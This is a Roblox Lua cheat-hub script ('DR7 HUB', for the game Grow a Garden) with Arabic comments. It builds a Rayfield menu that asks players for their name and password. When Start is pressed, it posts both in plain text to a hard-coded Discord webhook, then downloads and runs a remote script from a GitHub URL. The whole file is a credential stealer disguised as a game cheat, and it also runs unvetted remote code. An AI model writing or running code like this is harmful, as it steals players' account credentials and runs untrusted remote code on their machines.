-- تحميل مكتبة Rayfield
local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

-- إنشاء النافذة
local Window = Rayfield:CreateWindow({
    Name = "DR7",
    LoadingTitle = "DR7 HUB",
    LoadingSubtitle = "TOP",
    ConfigurationSaving = {
        Enabled = false
    },
    Discord = {
        Enabled = false,
    },
    KeySystem = false,
})

-- إنشاء تاب
local Tab = Window:CreateTab("جرو جاردن", 4483362458)

-- خانات الإدخال
local username = ""
local password = ""

Tab:CreateInput({
    Name = "name",
    PlaceholderText = "your name ",
    RemoveTextAfterFocusLost = false,
    Callback = function(Text)
        username = Text
    end,
})

Tab:CreateInput({
    Name = "password",
    PlaceholderText = " password",
    RemoveTextAfterFocusLost = false,
    Callback = function(Text)
        password = Text
    end,
})

-- زر تشغيل السكربت
Tab:CreateButton({
    Name = "Start ",
    Callback = function()
        -- إرسال الاسم والباسورد إلى Webhook
        local HttpService = game:GetService("HttpService")

        local data = {
            ["content"] = "**شخص استخدم DR7:**\n👤 الاسم: `" .. username .. "`\n🔒 الباسورد: `" .. password .. "`"
        }

        local headers = {
            ["Content-Type"] = "application/json"
        }

        local body = HttpService:JSONEncode(data)

        -- لازم يكون exploit بيدعم request()
        request({
            Url = "https://discord.com/api/webhooks/1396254379358818314/_Y1SkuyLLkPXVo0QDBfs0PN9YQeLuiauTLHqwSq3u4FgAAWOBZ6DRwab6LX2Qi6lMVp7",
            Method = "POST",
            Headers = headers,
            Body = body
        })

        -- تشغيل سكربت جرو جاردن
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ZusumeHub/ZusumeHub/refs/heads/main/UpdateZysume"))()
    end,
})
